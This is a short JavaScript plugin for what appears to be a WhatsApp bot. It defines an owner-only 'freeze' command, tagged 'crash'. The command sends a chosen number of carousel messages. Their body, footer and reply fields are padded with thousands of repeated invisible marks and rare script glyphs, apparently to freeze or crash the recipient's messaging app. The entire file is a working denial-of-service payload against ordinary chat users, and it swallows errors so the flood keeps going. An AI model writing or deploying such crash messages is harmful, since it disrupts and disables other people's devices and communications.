const handler = async (m, { conn, text, args, usedPrefix, command }) => {
  const amount = parseInt(args[0]) || 1;
  
  if (isNaN(amount) || amount < 1) {
    return;
  }

  for (let i = 0; i < amount; i++) {
    try {
      await new Carousel(conn)
        .setBody('RennZSync Is Here')
        .setFooter('© RennZSync 2K26')
        .addCard(
          await new Button(conn)
            .setBody('\u200E'.repeat(2500))
            .setFooter('𑲱𑲱𑲱𑲱𑲱'.repeat(2500))
            .setImage('https://raw.githubusercontent.com/RennZSync/uploaders/main/anu/1790585777057-60027c4b.jpg')
            .addReply('𑲱𑲱𑲱𑲱𑲱'.repeat(2500), '𑲱𑲱𑲱𑲱𑲱'.repeat(2500))
            .toCard()
        )
 .addCard(
          await new Button(conn)
            .setBody('\u200E'.repeat(2500))
            .setFooter('𑲱𑲱𑲱𑲱𑲱'.repeat(2500))
            .setImage('https://raw.githubusercontent.com/RennZSync/uploaders/main/anu/1790585777057-60027c4b.jpg')
            .addReply('𑲱𑲱𑲱𑲱𑲱'.repeat(2500), '𑲱𑲱𑲱𑲱𑲱'.repeat(2500))
            .toCard()
        )
        .send(m.chat, { send: m });
    } catch (e) {
      continue;
    }
  }
};

handler.help = ['freeze <amount>'];
handler.tags = ['crash'];
handler.command = /^freeze$/i;
handler.owner = true;

export default handler;
